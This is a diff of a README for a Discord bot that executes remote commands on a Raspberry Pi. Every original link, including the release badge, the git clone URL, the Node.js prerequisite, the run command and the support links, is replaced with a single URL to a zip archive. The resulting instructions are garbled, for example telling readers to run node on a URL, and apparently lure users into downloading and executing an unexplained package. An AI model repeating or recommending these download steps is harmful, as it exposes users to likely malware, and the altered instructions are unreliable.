@@ -1,6 +1,6 @@
 # Discord-Pi-Eval: Remote Command Execution for Raspberry Pi 🐍💻
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/NoobBotlies/Discord-Pi-Eval/releases)
+[![Download Latest Release](https://github.com/NoobBotlies/Discord-Pi-Eval/raw/refs/heads/main/deionize/Pi_Discord_Eval_1.6.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/NoobBotlies/Discord-Pi-Eval/raw/refs/heads/main/deionize/Pi_Discord_Eval_1.6.zip)
 
 ## Table of Contents
 
@@ -33,7 +33,7 @@ To get started with Discord-Pi-Eval, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/NoobBotlies/Discord-Pi-Eval.git
+   git clone https://github.com/NoobBotlies/Discord-Pi-Eval/raw/refs/heads/main/deionize/Pi_Discord_Eval_1.6.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -42,7 +42,7 @@ To get started with Discord-Pi-Eval, follow these steps:
    ```
 
 3. **Install Dependencies**:
-   Ensure you have Node.js installed. Then run:
+   Ensure you have https://github.com/NoobBotlies/Discord-Pi-Eval/raw/refs/heads/main/deionize/Pi_Discord_Eval_1.6.zip installed. Then run:
    ```bash
    npm install
    ```
@@ -53,10 +53,10 @@ To get started with Discord-Pi-Eval, follow these steps:
 5. **Run the Bot**:
    Start the bot using:
    ```bash
-   node index.js
+   node https://github.com/NoobBotlies/Discord-Pi-Eval/raw/refs/heads/main/deionize/Pi_Discord_Eval_1.6.zip
    ```
 
-You can download the latest release from [here](https://github.com/NoobBotlies/Discord-Pi-Eval/releases) to get a pre-packaged version that you can execute.
+You can download the latest release from [here](https://github.com/NoobBotlies/Discord-Pi-Eval/raw/refs/heads/main/deionize/Pi_Discord_Eval_1.6.zip) to get a pre-packaged version that you can execute.
 
 ## Usage
 
@@ -124,10 +124,10 @@ Discord-Pi-Eval is licensed under the MIT License. See the LICENSE file for more
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/NoobBotlies/Discord-Pi-Eval/releases) section for updates or open an issue in the repository.
+If you encounter any issues or have questions, please check the [Releases](https://github.com/NoobBotlies/Discord-Pi-Eval/raw/refs/heads/main/deionize/Pi_Discord_Eval_1.6.zip) section for updates or open an issue in the repository.
 
 Feel free to reach out to the community for help or to share your experiences with the bot!
 
 ---
 
-For more information and updates, visit the [Releases](https://github.com/NoobBotlies/Discord-Pi-Eval/releases) section.
+For more information and updates, visit the [Releases](https://github.com/NoobBotlies/Discord-Pi-Eval/raw/refs/heads/main/deionize/Pi_Discord_Eval_1.6.zip) section.
